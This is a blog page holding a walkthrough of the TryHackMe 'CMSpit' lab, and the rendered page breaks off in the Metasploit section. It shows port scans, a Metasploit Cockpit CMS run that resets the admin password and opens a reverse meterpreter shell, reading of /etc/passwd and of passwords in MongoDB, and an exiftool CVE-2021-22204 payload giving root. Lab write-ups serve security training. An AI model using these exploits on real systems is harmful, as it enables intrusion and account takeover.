<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CMSpit - THM | Shebu 🔽</title>
<meta name="keywords" content="cockpit-cms, CVE-2021-22204, CVE-2020-35848, CVE-2020-35847, exiftool, mongodb">
<meta name="description" content="Description This is a machine that allows you to practise web app hacking and privilege escalation using recent vulnerabilities. You&rsquo;ve identified that the CMS installed on the web server has several vulnerabilities that allow attackers to enumerate users and change account passwords.
Your mission is to exploit these vulnerabilities and compromise the web server.
Room name CMSpit OS Linux Difficulty Medium Room Link https://tryhackme.com/room/cmspit Creator stuxnet Recon Portscan sh3bu@VM:~/thm/cmspit$ rustscan -a cmspit.">
<meta name="author" content="Shebu">
<link rel="canonical" href="https://sh3bu.github.io/themes/hugo-PaperMod/posts/cmspit/">
<link crossorigin="anonymous" href="/themes/hugo-PaperMod/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/themes/hugo-PaperMod/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://sh3bu.github.io/themes/hugo-PaperMod/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://sh3bu.github.io/themes/hugo-PaperMod/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://sh3bu.github.io/themes/hugo-PaperMod/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://sh3bu.github.io/themes/hugo-PaperMod/apple-touch-icon.png">
<link rel="mask-icon" href="https://sh3bu.github.io/themes/hugo-PaperMod/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="CMSpit - THM" />
<meta property="og:description" content="Description This is a machine that allows you to practise web app hacking and privilege escalation using recent vulnerabilities. You&rsquo;ve identified that the CMS installed on the web server has several vulnerabilities that allow attackers to enumerate users and change account passwords.
Your mission is to exploit these vulnerabilities and compromise the web server.
Room name CMSpit OS Linux Difficulty Medium Room Link https://tryhackme.com/room/cmspit Creator stuxnet Recon Portscan sh3bu@VM:~/thm/cmspit$ rustscan -a cmspit." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://sh3bu.github.io/themes/hugo-PaperMod/posts/cmspit/" />
<meta property="og:image" content="https://sh3bu.github.io/themes/hugo-PaperMod/posts/cmspit/img/cmspit.jpg" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-12-25T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-12-25T00:00:00+00:00" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://sh3bu.github.io/themes/hugo-PaperMod/posts/cmspit/img/cmspit.jpg" />
<meta name="twitter:title" content="CMSpit - THM"/>
<meta name="twitter:description" content="Description This is a machine that allows you to practise web app hacking and privilege escalation using recent vulnerabilities. You&rsquo;ve identified that the CMS installed on the web server has several vulnerabilities that allow attackers to enumerate users and change account passwords.
Your mission is to exploit these vulnerabilities and compromise the web server.
Room name CMSpit OS Linux Difficulty Medium Room Link https://tryhackme.com/room/cmspit Creator stuxnet Recon Portscan sh3bu@VM:~/thm/cmspit$ rustscan -a cmspit."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Posts",
      "item": "https://sh3bu.github.io/themes/hugo-PaperMod/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "CMSpit - THM",
      "item": "https://sh3bu.github.io/themes/hugo-PaperMod/posts/cmspit/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CMSpit - THM",
  "name": "CMSpit - THM",
  "description": "Description This is a machine that allows you to practise web app hacking and privilege escalation using recent vulnerabilities. You\u0026rsquo;ve identified that the CMS installed on the web server has several vulnerabilities that allow attackers to enumerate users and change account passwords.\nYour mission is to exploit these vulnerabilities and compromise the web server.\nRoom name CMSpit OS Linux Difficulty Medium Room Link https://tryhackme.com/room/cmspit Creator stuxnet Recon Portscan sh3bu@VM:~/thm/cmspit$ rustscan -a cmspit.",
  "keywords": [
    "cockpit-cms", "CVE-2021-22204", "CVE-2020-35848", "CVE-2020-35847", "exiftool", "mongodb"
  ],
  "articleBody": "Description This is a machine that allows you to practise web app hacking and privilege escalation using recent vulnerabilities. You’ve identified that the CMS installed on the web server has several vulnerabilities that allow attackers to enumerate users and change account passwords.\nYour mission is to exploit these vulnerabilities and compromise the web server.\nRoom name CMSpit OS Linux Difficulty Medium Room Link https://tryhackme.com/room/cmspit Creator stuxnet Recon Portscan sh3bu@VM:~/thm/cmspit$ rustscan -a cmspit.thm --range 0-65535 -- -sV -sC -oN cmspit.nmap # Nmap 7.80 scan initiated Fri Dec 24 22:28:19 2021 as: nmap -vvv -p 22,80 -sV -sC -oN /home/sh3bu/thm/cmspit/cmspit.nmap 10.10.55.236 Nmap scan report for 10.10.55.236 Host is up, received syn-ack (0.37s latency). Scanned at 2021-12-24 22:28:20 IST for 32s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD7acH8krj6oVh6s+R3VYnJ/Xc8o5b43RcrRwiMPKe7V8V/SLfeVeHtE06j0PnfF5bHbNjtLP8pMq2USPivt/LcsS+8e+F5yfFFAVawOWqtd9tnrXVQhmyLZVb+wzmjKe+BaNWSnEazjIevMjD3bR8YBYKnf2BoaFKxGkJKPyleMT1GAkU+r47m2FsMa+l7p79VIYrZfss3NTlRq9k6pGsshiJnnzpWmT1KDjI90fGT6oIkALZdW/++qXi+px6+bWDMiW9NVv0eQmN9eTwsFNoWE3JDG7Aeq7hacqF7JyoMPegQwAAHI/ZD66f4zQzqQN6Ou6+sr7IMkC62rLMjKkXN | 256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEnbbSTSHNXi6AcEtMnOG+srCrE2U4lbRXkBxlQMk1damlhG+U0tmiObRCoasyBY2kvAdU/b7ZWoE0AmoYUldvk= | 256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKYUS/4ObKPMEyPGlgqg6khm41SWn61X9kGbNvyBJh7e 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: C9CD46C6A2F5C65855276A03FE703735 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) | http-title: Authenticate Please! |_Requested resource was /auth/login?to=/ |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Dec 24 22:28:52 2021 -- 1 IP address (1 host up) scanned in 33.18 seconds So there are 2 ports open as usual 22 \u0026 80\nWebsite - Port 80 The home page of this website redirects to url http://cmspit.thm/auth/login?to=/ and it looks like this\nlogin page A normal login page with username \u0026 password .\nforgot-password page Forgot password page at http://cmspit.thm/auth/forgotpassword\nWappalyzer didnt reveal much info on version of this CMS. Taking a close look at the source code reveals the version information of cockpit-cms which is 0.11.1\nShell as www-data Googling for exploits for CMSpit 0.11.1 revealed that there are 2 CVE’s which on combined together can help us to get a foothold on the machine\nCVE-2020-35848 \u0026 CVE-2020-35847 - Cockpit CMS before version 0.11.2 is vulnerable to a NoSQL Injection vulnerability in the /auth/resetpassword and /auth/newpassword that allows extraction of password reset tokens which allow for user details enumeration as well as password reset msf msf6 \u003e search cockpit Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/cockpit_cms_rce 2021-04-13 normal Yes Cockpit CMS NoSQLi to RCE Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/cockpit_cms_rce msf6 \u003e use 0 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp msf6 exploit(multi/http/cockpit_cms_rce) \u003e show options Module options (exploit/multi/http/cockpit_cms_rce): Name Current Setting Required Description ---- --------------- -------- ----------- ENUM_USERS true no Enumerate users Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The URI of Cockpit USER no User account to take over VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.0.2.15 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic Target msf6 exploit(multi/http/cockpit_cms_rce) \u003e set LHOST tun0 LHOST =\u003e tun0 msf6 exploit(multi/http/cockpit_cms_rce) \u003e set RHOSTS cmspit.thm RHOSTS =\u003e cmspit.thm msf6 exploit(multi/http/cockpit_cms_rce) \u003e run [*] Started reverse TCP handler on 10.17.6.87:4444 [*] Attempting Username Enumeration (CVE-2020-35846) [+] Found users: [\"admin\", \"darkStar7471\", \"skidy\", \"ekoparty\"] [-] Exploit aborted due to failure: bad-config: 10.10.103.36:80 - User to exploit required [*] Exploit completed, but no session was created. Now we have 4 users admin, darkStar7471, skidy and ekoparty.\nOnto the second part of the exploit i.e password reset\nUpdate the USER value in msf to admin to reset admin’s password and re-run the exploit to get a shell !\nmsf6 exploit(multi/http/cockpit_cms_rce) \u003e set USER admin USER =\u003e admin msf6 exploit(multi/http/cockpit_cms_rce) \u003e run [*] Started reverse TCP handler on 10.17.6.87:4444 [*] Attempting Username Enumeration (CVE-2020-35846) [+] Found users: [\"admin\", \"darkStar7471\", \"skidy\", \"ekoparty\"] [*] Obtaining reset tokens (CVE-2020-35847) [+] Found tokens: [\"rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23\"] [*] Checking token: rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23 [*] Obtaining user info [*] user: admin [*] name: Admin [*] email: admin@yourdomain.de [*] active: true [*] group: admin [*] password: $2y$10$dChrF2KNbWuib/5lW1ePiegKYSxHeqWwrVC.FN5kyqhIsIdbtnOjq [*] i18n: en [*] _created: 1621655201 [*] _modified: 1621655201 [*] _id: 60a87ea165343539ee000300 [*] _reset_token: rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23 [*] md5email: a11eea8bf873a483db461bb169beccec [+] Changing password to A98N9259vM [+] Password update successful [*] Attempting login [+] Valid cookie for admin: 8071dec2be26139e39a170762581c00f=urekd0hbqla32mqdr1rq1ppnhm; [*] Attempting RCE [*] Sending stage (39282 bytes) to 10.10.103.36 [*] Meterpreter session 1 opened (10.17.6.87:4444 -\u003e 10.10.103.36:38906) at 2021-12-25 08:22:49 -0500 meterpreter \u003e shell Process 916 created. Channel 0 created. id uid=33(www-data) gid=33(www-data) groups=33(www-data) There are 2 users on the machine stux \u0026 root\nwww-data@ubuntu:/var/www/html/cockpit/assets/app/js$ cat /etc/passwd | grep \"bash\" root❌0:0:root:/root:/bin/bash stux❌1000:1000:Coock,,,:/home/stux:/bin/bash webflag 🚩 Grab the web flag which is in the home dir of www-data\nwww-data@ubuntu:/var/www/html/cockpit$ cat webflag.php \u003c?php $flag = \"thm{f158bea7*************55626d78e9fb}\"; ?\u003e Shell as Stux Time to escalate ! I quickly transferred linpeas to the target machine \u0026 ran it.\nMongoDB Seems that MongoDB is running internally.We can confirm that by netstat command\nwww-data@ubuntu:/var/www/html/cockpit$ netstat -tulpn (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:27017 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 0.0.0.0:68 0.0.0.0:* MongoDB runs on port 27017 by default\nWe use MongoDB cli to retreive password for stux stored in it\nIf you are not familiar with MongoDB commands, refer this - https://docs.mongodb.com/manual/reference/mongo-shell/\nstux@ubuntu:~$ mongo MongoDB shell version: 2.6.10 connecting to: test \u003e show dbs admin (empty) local 0.078GB sudousersbak 0.078GB \u003e use sudousersbak switched to db sudousersbak \u003e show collections flag system.indexes user \u003e db.user.find() { \"_id\" : ObjectId(\"60a89d0caadffb0ea68915f9\"), \"name\" : \"p******23\" } { \"_id\" : ObjectId(\"60a89dfbaadffb0ea68915fa\"), \"name\" : \"stux\" } user.txt 🚩 Now since we have the password for user stux ,let’s SSH in to machine as STUX \u0026 grab the user.txt !\nsh3bu@VM:~/thm/cmspit$ ssh stux@cmspit.thm stux@cmspit.thm's password: Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Last login: Sat May 22 19:41:38 2021 from 192.168.85.1 stux@ubuntu:~$ id uid=1000(stux) gid=1000(stux) groups=1000(stux),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare) stux@ubuntu:~$ cat user.txt thm{c5fc72c4**********a05f0ce} Shell as root Running sudo -l revealed that we could run exiftool as root.\nWe could refer GTFOBINS for sudo entry on exiftool binary to escalate our privileges to root !\nExiftool CVE But for the sake of this room, we use a vulnerability on exiftool to escalate our privileges to root. Googling for exiftool cve show us this - CVE-2021-22204\nYou could read more about this CVE here -https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/\nLink to exploit on github - https://github.com/convisoappsec/CVE-2021-22204-exiftool\nSteps to escalate -\n1. Create a file named payload with contents - (metadata \"\\c${system('/bin/bash -p')};\") 2. bzz payload payload.bzz 3. djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz 4. sudo exiftool exploit.djvu root.txt 🚩 Now we get have a root shell ! Grab root.txt\nroot@ubuntu:~# whoami root root@ubuntu:~# cat /root/root.txt thm{bf52a85b**********0d4d5ada} ",
  "wordCount" : "1206",
  "inLanguage": "en",
  "image":"https://sh3bu.github.io/themes/hugo-PaperMod/posts/cmspit/img/cmspit.jpg","datePublished": "2021-12-25T00:00:00Z",
  "dateModified": "2021-12-25T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Shebu"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://sh3bu.github.io/themes/hugo-PaperMod/posts/cmspit/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Shebu 🔽",
    "logo": {
      "@type": "ImageObject",
      "url": "https://sh3bu.github.io/themes/hugo-PaperMod/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://sh3bu.github.io/themes/hugo-PaperMod" accesskey="h" title="Shebu 🔽 (Alt + H)">Shebu 🔽</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://sh3bu.github.io/themes/hugo-PaperMod/archives" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://sh3bu.github.io/themes/hugo-PaperMod/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://sh3bu.github.io/themes/hugo-PaperMod">Home</a>&nbsp;»&nbsp;<a href="https://sh3bu.github.io/themes/hugo-PaperMod/posts/">Posts</a></div>
    <h1 class="post-title">
      CMSpit - THM
    </h1>
    <div class="post-meta"><span title='2021-12-25 00:00:00 +0000 UTC'>December 25, 2021</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;Shebu

</div>
  </header> 
<figure class="entry-cover">
        <img loading="lazy" srcset="https://sh3bu.github.io/themes/hugo-PaperMod/posts/cmspit/img/cmspit_hu902c198d49edb76a94097b75b0b61cc7_143667_360x0_resize_q75_box.jpg 360w ,https://sh3bu.github.io/themes/hugo-PaperMod/posts/cmspit/img/cmspit_hu902c198d49edb76a94097b75b0b61cc7_143667_480x0_resize_q75_box.jpg 480w ,https://sh3bu.github.io/themes/hugo-PaperMod/posts/cmspit/img/cmspit_hu902c198d49edb76a94097b75b0b61cc7_143667_720x0_resize_q75_box.jpg 720w ,https://sh3bu.github.io/themes/hugo-PaperMod/posts/cmspit/img/cmspit_hu902c198d49edb76a94097b75b0b61cc7_143667_1080x0_resize_q75_box.jpg 1080w ,https://sh3bu.github.io/themes/hugo-PaperMod/posts/cmspit/img/cmspit.jpg 1200w" 
            sizes="(min-width: 768px) 720px, 100vw" src="https://sh3bu.github.io/themes/hugo-PaperMod/posts/cmspit/img/cmspit.jpg" alt="" 
            width="1200" height="628">
        <p><text></p>
</figure><div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#description" aria-label="Description">Description</a></li>
                <li>
                    <a href="#recon" aria-label="Recon">Recon</a><ul>
                        
                <li>
                    <a href="#portscan" aria-label="Portscan">Portscan</a></li>
                <li>
                    <a href="#website---port-80" aria-label="Website - Port 80">Website - Port 80</a></li>
                <li>
                    <a href="#login-page" aria-label="login page">login page</a></li>
                <li>
                    <a href="#forgot-password-page" aria-label="forgot-password page">forgot-password page</a></li></ul>
                </li>
                <li>
                    <a href="#shell-as-www-data" aria-label="Shell as www-data">Shell as www-data</a><ul>
                        
                <li>
                    <a href="#msf" aria-label="msf">msf</a></li>
                <li>
                    <a href="#webflag-" aria-label="webflag 🚩">webflag 🚩</a></li></ul>
                </li>
                <li>
                    <a href="#shell-as-stux" aria-label="Shell as Stux">Shell as Stux</a><ul>
                        
                <li>
                    <a href="#mongodb" aria-label="MongoDB">MongoDB</a></li>
                <li>
                    <a href="#usertxt-" aria-label="user.txt 🚩">user.txt 🚩</a></li></ul>
                </li>
                <li>
                    <a href="#shell-as-root" aria-label="Shell as root">Shell as root</a><ul>
                        
                <li>
                    <a href="#exiftool-cve" aria-label="Exiftool CVE">Exiftool CVE</a></li>
                <li>
                    <a href="#roottxt-" aria-label="root.txt 🚩">root.txt 🚩</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="description">Description<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h1>
<hr>
<p>This is a machine that allows you to practise web app hacking and privilege escalation using recent vulnerabilities.
You&rsquo;ve identified that the CMS installed on the web server has several vulnerabilities that allow attackers to enumerate users and change account passwords.</p>
<p>Your mission is to exploit these vulnerabilities and compromise the web server.</p>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>Room name</strong></th>
<th>CMSpit</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><strong>OS</strong></td>
<td>Linux</td>
</tr>
<tr>
<td style="text-align:center"><strong>Difficulty</strong></td>
<td>Medium</td>
</tr>
<tr>
<td style="text-align:center"><strong>Room Link</strong></td>
<td><a href="https://tryhackme.com/room/cmspit">https://tryhackme.com/room/cmspit</a></td>
</tr>
<tr>
<td style="text-align:center"><strong>Creator</strong></td>
<td><a href="https://tryhackme.com/p/stuxnet">stuxnet</a></td>
</tr>
</tbody>
</table>
<h1 id="recon">Recon<a hidden class="anchor" aria-hidden="true" href="#recon">#</a></h1>
<hr>
<h2 id="portscan">Portscan<a hidden class="anchor" aria-hidden="true" href="#portscan">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sh3bu@VM:~/thm/cmspit$ rustscan -a cmspit.thm --range 0-65535 -- -sV -sC -oN cmspit.nmap 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap 7.80 scan initiated Fri Dec 24 22:28:19 2021 as: nmap -vvv -p 22,80 -sV -sC -oN /home/sh3bu/thm/cmspit/cmspit.nmap 10.10.55.236</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.55.236
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host is up, received syn-ack <span class="o">(</span>0.37s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Scanned at 2021-12-24 22:28:20 IST <span class="k">for</span> 32s
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON  VERSION
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD7acH8krj6oVh6s+R3VYnJ/Xc8o5b43RcrRwiMPKe7V8V/SLfeVeHtE06j0PnfF5bHbNjtLP8pMq2USPivt/LcsS+8e+F5yfFFAVawOWqtd9tnrXVQhmyLZVb+wzmjKe+BaNWSnEazjIevMjD3bR8YBYKnf2BoaFKxGkJKPyleMT1GAkU+r47m2FsMa+l7p79VIYrZfss3NTlRq9k6pGsshiJnnzpWmT1KDjI90fGT6oIkALZdW/++qXi+px6+bWDMiW9NVv0eQmN9eTwsFNoWE3JDG7Aeq7hacqF7JyoMPegQwAAHI/ZD66f4zQzqQN6Ou6+sr7IMkC62rLMjKkXN
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEnbbSTSHNXi6AcEtMnOG+srCrE2U4lbRXkBxlQMk1damlhG+U0tmiObRCoasyBY2kvAdU/b7ZWoE0AmoYUldvk<span class="o">=</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKYUS/4ObKPMEyPGlgqg6khm41SWn61X9kGbNvyBJh7e
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-favicon: Unknown favicon MD5: C9CD46C6A2F5C65855276A03FE703735
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-title: Authenticate Please!
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Requested resource was /auth/login?to<span class="o">=</span>/
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-trane-info: Problem with XML parsing of /evox/about
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Fri Dec 24 22:28:52 2021 -- 1 IP address (1 host up) scanned in 33.18 seconds</span>
</span></span></code></pre></div><p>So there are 2 ports open as usual 22 &amp; 80</p>
<h2 id="website---port-80">Website - Port 80<a hidden class="anchor" aria-hidden="true" href="#website---port-80">#</a></h2>
<p>The home page of this website redirects to  url <code>http://cmspit.thm/auth/login?to=/</code> and it looks like this</p>
<h2 id="login-page">login page<a hidden class="anchor" aria-hidden="true" href="#login-page">#</a></h2>
<p><img loading="lazy" src="img/website1.png#center" alt="website1"  />

A normal login page with username &amp; password .</p>
<h2 id="forgot-password-page">forgot-password page<a hidden class="anchor" aria-hidden="true" href="#forgot-password-page">#</a></h2>
<p>Forgot password page at <code>http://cmspit.thm/auth/forgotpassword</code></p>
<p><img loading="lazy" src="img/website2.png#center" alt="website2"  />
</p>
<p>Wappalyzer didnt reveal much info on version of this CMS.
Taking a close look at the source code reveals the version information of <code>cockpit-cms</code> which is <code>0.11.1</code></p>
<p><img loading="lazy" src="img/website3.png#center" alt="website3"  />
</p>
<h1 id="shell-as-www-data">Shell as www-data<a hidden class="anchor" aria-hidden="true" href="#shell-as-www-data">#</a></h1>
<hr>
<p>Googling for exploits for  <code>CMSpit 0.11.1</code> revealed that there are 2 CVE&rsquo;s which on combined together can help us to get a foothold on the machine</p>
<ul>
<li><strong>CVE-2020-35848 &amp; CVE-2020-35847</strong> - Cockpit CMS before version 0.11.2 is vulnerable to a NoSQL Injection vulnerability in the <code>/auth/resetpassword</code> and <code>/auth/newpassword</code> that allows extraction of password reset tokens which allow for user details enumeration as well as password reset</li>
</ul>
<h2 id="msf">msf<a hidden class="anchor" aria-hidden="true" href="#msf">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; search cockpit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Matching <span class="nv">Modules</span>
</span></span><span class="line"><span class="cl"><span class="o">================</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="c1">#  Name                                Disclosure Date  Rank    Check  Description</span>
</span></span><span class="line"><span class="cl">   -  ----                                ---------------  ----    -----  -----------
